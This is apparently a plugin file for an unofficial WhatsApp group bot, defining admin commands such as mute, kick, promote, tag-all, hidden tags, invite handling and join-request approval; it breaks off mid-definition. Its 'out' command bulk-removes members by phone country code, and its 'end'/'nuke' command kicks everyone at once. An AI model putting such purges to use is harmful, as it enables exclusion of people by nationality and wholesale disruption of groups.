
import { fileURLToPath } from 'url';
import config from '../config.js';
import { cmd } from '../command.js';
import { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } from '../lib/functions.js';
import converter from '../lib/converter.js';

const __filename = fileURLToPath(import.meta.url);

// ==================== UNMUTE COMMAND ====================
cmd({
    pattern: "unmute",
    alias: ["unlock", "open"],
    desc: "Unmute the group (admins only)",
    category: "group",
    react: "🔊",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to unmute the group.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only group admins or owner can use this command.");

        await conn.groupSettingUpdate(from, 'not_announcement');
        await reply("*🔊 Group has been unmuted!* \nEveryone can send messages now.");

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to unmute group. Something went wrong.");
    }
});

// ===============================
// ANTI Status COMMAND - FIXED
// ===============================
cmd({
    pattern: "antistatus",
    alias: ["anti-status"],
    desc: "Toggle Anti Status protection\n\n*Options:*\n• on - Enable Anti Status (warn + delete)\n• off - Disable Anti Status\n• warn - Only warn users\n• delete - Only delete messages",
    category: "settings",
    react: "🚫",
    filename: __filename
},
async (conn, mek, m, { from, reply, isCreator, args, updateUserConfig, userConfig, sanitizedNumber }) => {
    if (!isCreator) {
        return reply("*📛 ᴛʜɪs ɪs ᴀɴ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅ.*");
    }

    if (!args[0]) {
        return reply(`📌 *Usᴀɢᴇ:* antistatus on/off/warn/delete\n*Cᴜʀʀᴇɴᴛ:* ${userConfig.ANTI_STATUS === 'true' ? 'on' : userConfig.ANTI_STATUS === 'false' ? 'off' : userConfig.ANTI_STATUS || 'off'}\n\n*Oᴘᴛɪᴏɴs:*\n• on - Warn + delete Status\n• off - Disable Anti Status\n• warn - Only warn users\n• delete - Only delete messages`);
    }

    const value = args[0].toLowerCase();
    if (value !== 'on' && value !== 'off' && value !== 'warn' && value !== 'delete') {
        return reply("❌ Please use: on, off, warn, or delete");
    }

    // Convert 'on' to 'true', 'off' to 'false', keep 'warn' and 'delete' as is
    let configValue;
    let responseMsg = "";
    
    if (value === "on") {
        configValue = "true";
        responseMsg = "✅ Anti Status set to ON\n\nUsers sending Status will be warned and messages will be deleted.";
    } else if (value === "off") {
        configValue = "false";
        responseMsg = "✅ Anti Status set to OFF\n\nNo Status protection active.";
    } else if (value === "warn") {
        configValue = "warn";
        responseMsg = "✅ Anti Status set to WARN\n\nUsers will receive warnings when sending Status, but messages won't be deleted.";
    } else if (value === "delete") {
        configValue = "delete";
        responseMsg = "✅ Anti Status set to DELETE\n\nStatus messages will be deleted without warning.";
    }

    userConfig.ANTI_STATUS = configValue;
    await updateUserConfig(sanitizedNumber, userConfig);
    
    await reply(responseMsg);
});

// ==================== MUTE COMMAND ====================
cmd({
    pattern: "mute",
    alias: ["close", "lock"],
    desc: "Mute the group (admins only)",
    category: "group",
    react: "🔇",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to mute the group.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only group admins or owner can use this command.");

        await conn.groupSettingUpdate(from, 'announcement');
        await reply("*🔇 Group has been muted!* \nOnly admins can send messages now.");

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to mute group. Something went wrong.");
    }
});

// ==================== TAGALL COMMAND ====================
cmd({
    pattern: "tagall",
    react: "🔊",
    alias: ["gc_tagall"],
    desc: "To Tag all Members",
    category: "group",
    use: '.tagall [message]',
    filename: __filename
}, async (conn, mek, m, { from, participants, reply, isGroup, isAdmins, isCreator, prefix, command, args, body }) => {
    try {
        if (!isGroup) {
            await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
            return reply("❌ This command can only be used in groups.");
        }

        if (!isAdmins && !isCreator) {
            await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
            return reply("❌ Only group admins or the bot owner can use this command.");
        }

        let groupInfo = await conn.groupMetadata(from).catch(() => null);
        if (!groupInfo) return reply("❌ Failed to fetch group information.");

        let groupName = groupInfo.subject || "Unknown Group";
        let totalMembers = participants ? participants.length : 0;
        if (totalMembers === 0) return reply("❌ No members found in this group.");

        let emojis = ['📢', '🔊', '🌐', '🔰', '❤‍🩹', '🤍', '🖤', '🩵', '📝', '💗', '🔖', '🪩', '📦', '🎉', '🛡️', '💸', '⏳', '🗿', '🚀', '🎧', '🪀', '⚡', '🚩', '🍁', '🗣️', '👻', '⚠️', '🔥'];
        let randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        let message = body.slice(body.indexOf(command) + command.length).trim();
        if (!message) message = "Attention Everyone";

        let teks = `▢ Group : *${groupName}*\n▢ Members : *${totalMembers}*\n▢ Message: *${message}*\n\n┌───⊷ *MENTIONS*\n`;

        for (let mem of participants) {
            if (!mem.id) continue;
            teks += `${randomEmoji} @${mem.id.split('@')[0]}\n`;
        }

        teks += "└──✪ 𝐍𝐀𝐖𝐀𝐙 ┃ 𝐌𝐃 ✪──";

        conn.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: mek });

    } catch (e) {
        console.error("TagAll Error:", e);
        reply(`❌ *Error Occurred !!*\n\n${e.message || e}`);
    }
});

// ==================== KICK COMMAND ====================
cmd({
    pattern: "kick",
    alias: ["k", "remove", "nital"],
    desc: "Remove a user from the group",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, {
    from,
    isCreator,
    isBotAdmins,
    isAdmins,
    isGroup,
    reply
}) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ Bot must be admin.");
        if (!isCreator && !isAdmins) return await reply("❌ Only group admins or bot owner can use this command.");

        let user = null;

        // Mention
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            user = m.mentionedJid[0];
        }

        // Reply
        if (!user && mek.message?.extendedTextMessage?.contextInfo?.participant) {
            user = mek.message.extendedTextMessage.contextInfo.participant;
        }

        // Quoted
        if (!user && m.quoted?.sender) {
            user = m.quoted.sender;
        }

        if (!user) {
            return await reply("❓ Reply to a user's message or mention a user.");
        }

        const metadata = await conn.groupMetadata(from);
        const participant = metadata.participants.find(p => p.id === user);

        if (!participant) {
            return await reply("❌ User not found in this group.");
        }

        if (participant.admin) {
            return await reply("❌ I can't remove a group admin.");
        }

        const botJid = conn.user.id.split(":")[0] + "@s.whatsapp.net";

        if (user === botJid) {
            return await reply("❌ I can't remove myself.");
        }

        await conn.groupParticipantsUpdate(from, [user], "remove");

        await conn.sendMessage(from, {
            text: `✅ Successfully removed @${user.split("@")[0]}`,
            mentions: [user]
        }, { quoted: mek });

    } catch (err) {
        console.error("Kick Error:", err);
        await reply("❌ Failed to remove user.\n" + err.message);
    }
});

// ==================== PROMOTE COMMAND ====================
cmd({
    pattern: "promote",
    alias: ["p", "giveadmin", "permote", "admin"],
    desc: "Promote a user to admin",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, quoted, reply, botNumber2, botNumber }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to promote someone.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only group admins or owner can use this command.");

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return await reply("❓ You did not give me a user to promote!");
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        if (!users) return await reply("⚠️ Couldn't determine target user.");

        if (users === botNumber || users === botNumber2) return await reply("🤖 I can't promote myself!");
        const self = conn.user.id.split(":")[0] + '@s.whatsapp.net';
        if (users === self) return await reply("👑 Owner is already super admin!");

        await conn.groupParticipantsUpdate(from, [users], "promote");
        await reply(`*✅ Successfully Promoted to Admin.*`, { mentions: [users] });

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to promote. Something went wrong.");
    }
});

// ==================== DEMOTE COMMAND ====================
cmd({
    pattern: "demote",
    alias: ["d", "dismiss", "removeadmin"],
    desc: "Demote a group admin",
    category: "group",
    react: "💀",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, quoted, reply, botNumber2, botNumber }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to demote someone.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only group admins or owner can use this command.");

        if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
            return await reply("❓ You did not give me a user to demote!");
        }
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : null;
        if (!users) return await reply("⚠️ Couldn't determine target user.");

        if (users === botNumber || users === botNumber2) return await reply("🤖 I can't demote myself!");
        const self = conn.user.id.split(":")[0] + '@s.whatsapp.net';
        if (users === self) return await reply("👑 I can't demote the owner!");

        await conn.groupParticipantsUpdate(from, [users], "demote");
        await reply(`*✅ Admin Successfully demoted to a normal member.*`, { mentions: [users] });

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to demote. Something went wrong.");
    }
});

// ==================== SET GROUP PICTURE COMMAND ====================
cmd({
    pattern: "gcpp",
    alias: ["gpp", "fullppgc", "gcdp", "groupdp"],
    react: "🏙️",
    desc: "Group Admin Only - Set group profile picture",
    category: "group",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to change group picture.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        if (!m.quoted) return await reply("*🍁 Please reply to an image with .gcpp*");

        const mtype = m.quoted.mtype;
        if (mtype !== "imageMessage") return await reply("❌ Only image messages are supported for group picture");

        const buffer = await m.quoted.download();
        await conn.updateProfilePicture(from, buffer);
        await reply("*✅ Group profile picture updated successfully!*");

    } catch (error) {
        console.error("setgcpp Error:", error);
        await reply("❌ Error updating group picture:\n" + error.message);
    }
});

// ==================== REVOKE LINK COMMAND ====================
cmd({
    pattern: "revoke",
    alias: ["resetlink", "newlink"],
    desc: "Reset group invite link",
    category: "group",
    react: "🔄",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to reset link.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        const newCode = await conn.groupRevokeInvite(from);
        await reply(`*✅ Link Reset Successful!*\n\n🔗 https://chat.whatsapp.com/${newCode}`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to reset link.");
    }
});

// ==================== LINK COMMAND ====================
cmd({
    pattern: "link",
    alias: ["invite", "gclink", "invitelink"],
    desc: "Get group invite link",
    category: "group",
    react: "🔗",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, isBotAdmins, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to get the invite link.");
        
        const inviteCode = await conn.groupInviteCode(from);
        const link = `https://chat.whatsapp.com/${inviteCode}`;
        await reply(`🔗 *Group Invite Link:*\n\n${link}`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to get group link. I may not have admin permission.");
    }
});

// ==================== GROUP INFO COMMAND ====================
cmd({
    pattern: "ginfo",
    alias: ["groupinfo"],
    desc: "Get group information",
    category: "group",
    react: "🥏",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply, metadata, participants }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to fetch group info.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        const groupData = metadata || await conn.groupMetadata(from);
        const groupAdmins = participants?.filter(p => p.admin) || [];
        let description = groupData.desc || 'No description';
        
        let text = `*「 Group Information 」*\n\n`;
        text += `*Name:* ${groupData.subject}\n`;
        text += `*ID:* ${groupData.id}\n`;
        text += `*Participants:* ${groupData.size}\n`;
        text += `*Created:* ${new Date(groupData.creation * 1000).toLocaleString()}\n\n`;
        text += `*Description:*\n${description}\n\n`;
        text += `*Admins (${groupAdmins.length}):*\n`;
        
        groupAdmins.forEach((admin, i) => {
            text += `${i+1}. @${admin.id.split('@')[0]}\n`;
        });

        try {
            const ppUrl = await conn.profilePictureUrl(from, 'image');
            await conn.sendMessage(from, {
                image: { url: ppUrl },
                caption: text,
                mentions: groupAdmins.map(a => a.id)
            }, { quoted: mek });
        } catch {
            await reply(text, { mentions: groupAdmins.map(a => a.id) });
        }

    } catch (err) {
        console.error('Group info error:', err);
        await reply("❌ Failed to fetch group information. Error: " + err.message);
    }
});

// ==================== UPDATE GROUP DESCRIPTION COMMAND ====================
cmd({
    pattern: "updategdesc",
    alias: ["gdesc", "setdesc", "groupdesc"],
    desc: "Change the group description",
    category: "group",
    react: "📜",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to change group description.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");
        
        if (!q) return await reply("❌ Please provide a new group description.\nExample: `gdesc Welcome to our group!`");

        if (q.length > 500) return await reply("⚠️ Description is too long (max 500 characters).");

        await conn.groupUpdateDescription(from, q);
        await reply("✅ Group description updated successfully!");

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to update group description.");
    }
});

// ==================== UPDATE GROUP NAME COMMAND ====================
cmd({
    pattern: "updategname",
    alias: ["gname", "setname", "groupname"],
    desc: "Change the group name",
    category: "group",
    react: "📝",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to change group name.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");
        
        if (!q) return await reply("❌ Please provide a new group name.\nExample: `gname My New Group`");

        if (q.length > 100) return await reply("⚠️ Group name is too long (max 100 characters).");

        await conn.groupUpdateSubject(from, q);
        await reply(`✅ Group name changed to: *${q}*`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to update group name.");
    }
});

// ==================== POLL COMMAND ====================
cmd({
    pattern: "poll",
    alias: ["vote", "survey"],
    desc: "Create a poll with question and options",
    category: "group",
    filename: __filename,
}, async (conn, mek, m, { from, isCreator, isAdmins, isGroup, q, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can create polls.");
        
        if (!q) {
            return await reply("❓ Usage: `poll Question;Option1,Option2,Option3`\nExample: `poll Best color?;Red,Blue,Green,Black`");
        }

        const parts = q.split(";");
        if (parts.length < 2) {
            return await reply("⚠️ Please provide both question and options.\nFormat: Question;Option1,Option2,Option3");
        }

        const question = parts[0].trim();
        const optionsString = parts[1].trim();

        if (!question || !optionsString) {
            return await reply("⚠️ Question and options are required.");
        }

        const options = optionsString.split(",").map(opt => opt.trim()).filter(opt => opt.length > 0);

        if (options.length < 2) return await reply("❌ Please provide at least two options.");
        if (options.length > 12) return await reply("⚠️ Maximum 12 options allowed.");

        await conn.sendMessage(from, {
            poll: {
                name: question,
                values: options,
                selectableCount: 1,
                toAnnouncementGroup: true,
            }
        }, { quoted: mek });

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to create poll.");
    }
});

// ==================== OUT COMMAND (Remove by Country Code) ====================
cmd({
    pattern: "out",
    alias: ["ck", "🦶"],
    desc: "Removes all members with specific country code from the group",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isBotAdmins, reply, groupMetadata, isCreator }) => {
    if (!isGroup) return reply("❌ This command can only be used in groups.");
    if (!isCreator) return await conn.sendMessage(from, { text: "*📛 This is an owner command.*" }, { quoted: mek });
    if (!isBotAdmins) return reply("❌ I need to be an admin to use this command.");
    if (!q) return reply("❌ Please provide a country code. Example: .out 92");

    const countryCode = q.trim();
    if (!/^\d+$/.test(countryCode)) {
        return reply("❌ Invalid country code. Please provide only numbers (e.g., 92 for +92 numbers)");
    }

    try {
        const participants = await groupMetadata.participants;
        const targets = participants.filter(participant => participant.id.startsWith(countryCode) && !participant.admin);

        if (targets.length === 0) return reply(`❌ No members found with country code +${countryCode}`);

        const jids = targets.map(p => p.id);
        await conn.groupParticipantsUpdate(from, jids, "remove");
        reply(`✅ Successfully removed ${targets.length} members with country code +${countryCode}`);
    } catch (error) {
        console.error("Out command error:", error);
        reply("❌ Failed to remove members. Error: " + error.message);
    }
});

// ==================== NEW GROUP CREATE COMMAND ====================
cmd({
    pattern: "newgc",
    alias: ["creategroup", "makegroup"],
    desc: "Create a new group and add participants",
    category: "group",
    filename: __filename,
}, async (conn, mek, m, { from, isCreator, body, reply }) => {
    try {
        if (!isCreator) return await reply("🔐 Only bot owner can use this command.");
        
        if (!body) {
            return await reply("❓ Usage: `newgc Group Name;number1,number2,...`\nExample: `newgc My Group;923001234567,923009876543`");
        }

        const parts = body.split(";");
        if (parts.length < 2) return await reply("⚠️ Please provide both group name and numbers.\nFormat: Group Name;number1,number2,...");

        const groupName = parts[0].trim();
        const numbersString = parts[1].trim();

        if (!groupName || !numbersString) return await reply("⚠️ Group name and numbers are required.");

        const participantNumbers = numbersString.split(",").map(num => {
            let cleanNum = num.trim();
            if (cleanNum.startsWith("3")) cleanNum = "92" + cleanNum;
            return cleanNum.includes('@') ? cleanNum : `${cleanNum}@s.whatsapp.net`;
        }).filter(num => num.match(/^\d+@s\.whatsapp\.net$/));

        if (participantNumbers.length === 0) return await reply("❌ No valid phone numbers provided.\nExample: 923001234567,923009876543");

        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        if (!participantNumbers.includes(ownerJid)) participantNumbers.push(ownerJid);

        const group = await conn.groupCreate(groupName, participantNumbers);
        const inviteCode = await conn.groupInviteCode(group.id);
        const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;

        await conn.sendMessage(group.id, { text: `🎉 *Welcome to ${groupName}!*\n\nGroup created successfully!\nInvite Link: ${inviteLink}\n\nUse this link to invite more members.` });
        await reply(`✅ Group created successfully!\n\n📌 *Name:* ${groupName}\n👥 *Members:* ${participantNumbers.length}\n🔗 *Link:* ${inviteLink}`);

    } catch (err) {
        console.error(err);
        if (err.message?.includes("401")) await reply("❌ I'm not authorized to create groups.");
        else if (err.message?.includes("invalid")) await reply("❌ Invalid phone number(s) provided.");
        else await reply("❌ Failed to create group: " + (err.message || "Unknown error"));
    }
});

// ==================== LEAVE GROUP COMMAND ====================
cmd({
    pattern: "leave",
    alias: ["left", "leftgc", "leavegc"],
    desc: "Leave the group",
    react: "🎉",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, isCreator, reply }) => {
    try {
        if (!isGroup) return reply("❗ This command can only be used in *groups*.");
        if (!isCreator) return reply("❗ This command can only be used by my *owner*.");

        await reply(`👋 *Goodbye everyone!* I am leaving the group now. Thanks for having me here! ❤️`);
        await sleep(1500);
        await conn.groupLeave(from);

    } catch (e) {
        console.error(e);
        reply(`❌ Error: ${e.message}`);
    }
});

// ==================== END GROUP (Kick All) COMMAND ====================
cmd({
    pattern: "end",
    alias: ["byeall", "kickall", "endgc", "nuke"],
    desc: "Removes all members from group except specified numbers",
    category: "group",
    react: "⚠️",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, botNumber2, botNumber, isGroup, sender, metadata, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to remove members.");
        if (!isCreator) return await reply("🔐 Only bot owner can use this command.");

        const ignoreJids = [botNumber2, botNumber, sender];
        const groupData = metadata || await conn.groupMetadata(from);
        const participants = groupData.participants || [];
        const targets = participants.filter(p => !ignoreJids.includes(p.id));
        const jids = targets.map(p => p.id);

        if (jids.length === 0) return await reply("✅ No members to remove (everyone is excluded).");

        await conn.groupParticipantsUpdate(from, jids, "remove");
        await reply(`✅ Successfully removed ${jids.length} member${jids.length > 1 ? 's' : ''} from the group.`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to remove members. I may not have admin permission.");
    }
});

// ==================== JOIN GROUP COMMAND ====================
cmd({
    pattern: "join",
    alias: ["j", "joinlink", "gclink"],
    desc: "Join a group using invite link",
    category: "group",
    react: "⚙️",
    filename: __filename
}, async (conn, mek, m, { isCreator, q, quoted, reply }) => {
    try {
        if (!isCreator) return await reply("🔐 Only bot owner can use this command.");
        
        let link;

        if (quoted && quoted.text) {
            const linkMatch = quoted.text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
            if (linkMatch) link = linkMatch[1];
        }
        
        if (!link && q) {
            const linkMatch = q.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
            if (linkMatch) link = linkMatch[1];
        }

        if (!link) return await reply("❌ Please provide a valid WhatsApp group invite link.\nExample: join https://chat.whatsapp.com/ABC123XYZ");

        link = link.split('?')[0];

        try {
            await conn.groupAcceptInvite(link);
            await reply("✅ Successfully joined the group!");
        } catch (err) {
            if (err.message?.includes("already")) await reply("ℹ️ I'm already in this group.");
            else if (err.message?.includes("expired")) await reply("❌ This link has expired or been reset.");
            else if (err.message?.includes("invalid")) await reply("❌ Invalid group link.");
            else await reply("❌ Failed to join group: " + (err.message || "Unknown error"));
        }

    } catch (err) {
        console.error(err);
        await reply("❌ An error occurred while processing the command.");
    }
});

// ==================== INVITE COMMAND ====================
cmd({
    pattern: "invite",
    alias: ["aja"],
    desc: "Send group invite link to someone",
    category: "group",
    filename: __filename,
    react: "📨"
}, async (conn, mek, m, { from, args, isGroup, isBotAdmins, isCreator, isAdmins, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ Group only.");
        if (!isBotAdmins) return await reply("❌ I need admin.");
        if (!isCreator && !isAdmins) return await reply("🔐 Admins only.");
        
        if (!args[0]) {
            const code = await conn.groupInviteCode(from);
            return await reply(`🔗 Group Link:\nhttps://chat.whatsapp.com/${code}`);
        }

        let number = args[0].replace(/[^0-9]/g, '');
        if (number.length < 10) return await reply("⚠️ Invalid number.");
        
        let jid = number + "@s.whatsapp.net";
        const metadata = await conn.groupMetadata(from);
        const code = await conn.groupInviteCode(from);
        const link = `https://chat.whatsapp.com/${code}`;
        
        await conn.sendMessage(jid, { text: `📨 *You're invited to join ${metadata.subject}*\n\n🔗 ${link}\n\n👤 Invited by: @${m.sender.split('@')[0]}` });
        await reply(`📨 Invite sent to @${number}`, { mentions: [jid] });

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to send invite.");
    }
});

// ==================== HIDETAG COMMAND (Creator Only) ====================
cmd({
    pattern: "hidetag",
    alias: ["h"],
    react: "🔇",
    desc: "Hidden tag with custom message (Creator only) - Works with reply or direct message",
    category: "owner",
    use: '.h Hello everyone OR reply to any message with .h',
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isCreator, reply }) => {
    try {
        if (!isGroup) return reply("❌ This command can only be used in groups.");
        if (!isCreator) return reply("❌ Only the bot creator can use this command.");

        if (!m.quoted && !q) return reply("❌ Please provide a message or reply to media.");

        await conn.sendMessage(from, { react: { text: "⏳", key: mek.key } });
        
        const groupMetadata = await conn.groupMetadata(from);
        const participants = groupMetadata.participants;
        const mentionedJid = participants.map(p => p.id);
        
        let messageContent = {};

        if (m.quoted) {
            const quotedMsg = m.quoted;
            const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';
            const caption = quotedMsg.text || q || "";
            
            if (!mimeType) {
                messageContent = { text: caption || "📢 Hidden tag", mentions: mentionedJid };
            } else if (mimeType.startsWith('image/')) {
                const buffer = await quotedMsg.download();
                messageContent = { image: buffer, caption: caption || "", mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('video/')) {
                const buffer = await quotedMsg.download();
                const isGif = quotedMsg.message?.videoMessage?.gifPlayback || false;
                messageContent = { video: buffer, caption: caption || "", gifPlayback: isGif, mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('audio/')) {
                const buffer = await quotedMsg.download();
                const voiceNote = await converter.toPTT(buffer, 'mp3');
                messageContent = { audio: voiceNote, mimetype: 'audio/ogg; codecs=opus', ptt: true, mentions: mentionedJid };
            } else if (mimeType.includes('sticker')) {
                const buffer = await quotedMsg.download();
                messageContent = { sticker: buffer, mentions: mentionedJid };
            } else {
                messageContent = { text: caption || "📢 Hidden tag", mentions: mentionedJid };
            }
        } else if (q) {
            messageContent = { text: q, mentions: mentionedJid };
        }

        await conn.sendMessage(from, messageContent);
        await conn.sendMessage(from, { react: { text: "✅", key: mek.key } });

    } catch (e) {
        console.error("Hidden Tag Error:", e);
        reply(`❌ Error: ${e.message}`);
        await conn.sendMessage(from, { react: { text: "❌", key: mek.key } });
    }
});

// ==================== TAG COMMAND (Admins + Creator) ====================
cmd({
    pattern: "tag",
    alias: ["taggc"],
    react: "🔊",
    desc: "Tag all members (Admins & Creator) - Works with reply or direct message",
    category: "group",
    use: '.tag Hello everyone OR reply to any message with .tag',
    filename: __filename
}, async (conn, mek, m, { from, q, isGroup, isCreator, isAdmins, reply }) => {
    try {
        if (!isGroup) return reply("❌ This command can only be used in groups.");
        if (!isAdmins && !isCreator) return reply("❌ Only group admins can use this command.");

        if (!m.quoted && !q) return reply("❌ Please provide a message or reply to media to tag all members.");

        await conn.sendMessage(from, { react: { text: "⏳", key: mek.key } });
        
        const groupMetadata = await conn.groupMetadata(from);
        const participants = groupMetadata.participants;
        const mentionedJid = participants.map(p => p.id);
        
        let messageContent = {};

        if (m.quoted) {
            const quotedMsg = m.quoted;
            const mimeType = (quotedMsg.msg || quotedMsg).mimetype || '';
            const caption = quotedMsg.text || q || "";
            
            if (!mimeType) {
                messageContent = { text: caption || "📢 Tag all members", mentions: mentionedJid };
            } else if (mimeType.startsWith('image/')) {
                const buffer = await quotedMsg.download();
                messageContent = { image: buffer, caption: caption || "", mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('video/')) {
                const buffer = await quotedMsg.download();
                const isGif = quotedMsg.message?.videoMessage?.gifPlayback || false;
                messageContent = { video: buffer, caption: caption || "", gifPlayback: isGif, mimetype: mimeType, mentions: mentionedJid };
            } else if (mimeType.startsWith('audio/')) {
                const buffer = await quotedMsg.download();
                const voiceNote = await converter.toPTT(buffer, 'mp3');
                messageContent = { audio: voiceNote, mimetype: 'audio/ogg; codecs=opus', ptt: true, mentions: mentionedJid };
            } else if (mimeType.includes('sticker')) {
                const buffer = await quotedMsg.download();
                messageContent = { sticker: buffer, mentions: mentionedJid };
            } else {
                messageContent = { text: caption || "📢 Tag all members", mentions: mentionedJid };
            }
        } else if (q) {
            messageContent = { text: q, mentions: mentionedJid };
        }

        await conn.sendMessage(from, messageContent, { quoted: mek });
        await conn.sendMessage(from, { react: { text: "✅", key: mek.key } });

    } catch (e) {
        console.error("Tag Error:", e);
        reply(`❌ Error: ${e.message}`);
        await conn.sendMessage(from, { react: { text: "❌", key: mek.key } });
    }
});

// ==================== ACCEPT ALL JOIN REQUESTS COMMAND ====================
cmd({
    pattern: "acceptall",
    alias: ["approveall", "allowall"],
    desc: "Accepts all pending group join requests",
    category: "group",
    react: "✅",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to accept join requests.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply("ℹ️ No pending join requests to accept.");

        const jids = requests.map(u => u.jid);
        await conn.groupRequestParticipantsUpdate(from, jids, "approve");
        await reply(`✅ Successfully accepted ${requests.length} join request${requests.length > 1 ? 's' : ''}.`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to accept join requests.");
    }
});

// ==================== REJECT ALL JOIN REQUESTS COMMAND ====================
cmd({
    pattern: "rejectall",
    alias: ["declineall", "denyall"],
    desc: "Rejects all pending group join requests",
    category: "group",
    react: "❌",
    filename: __filename
}, async (conn, mek, m, { from, isCreator, isBotAdmins, isAdmins, isGroup, reply }) => {
    try {
        if (!isGroup) return await reply("⚠️ This command only works in groups.");
        if (!isBotAdmins) return await reply("❌ I must be admin to reject join requests.");
        if (!isAdmins && !isCreator) return await reply("🔐 Only admins can use this command.");

        const requests = await conn.groupRequestParticipantsList(from);
        
        if (!requests || requests.length === 0) return await reply("ℹ️ No pending join requests to reject.");

        const jids = requests.map(u => u.jid);
        await conn.groupRequestParticipantsUpdate(from, jids, "reject");
        await reply(`✅ Successfully rejected ${requests.length} join request${requests.length > 1 ? 's' : ''}.`);

    } catch (err) {
        console.error(err);
        await reply("❌ Failed to reject join requests.");
    }
});

// ==================== VIEW PENDING REQUESTS COMMAND ====================
cmd({
    pattern: "requests",
    alias: ["pending", "joinlist"],
    desc: "Shows pending group join requests with numbers",
    category: "group",
    react: "📋",
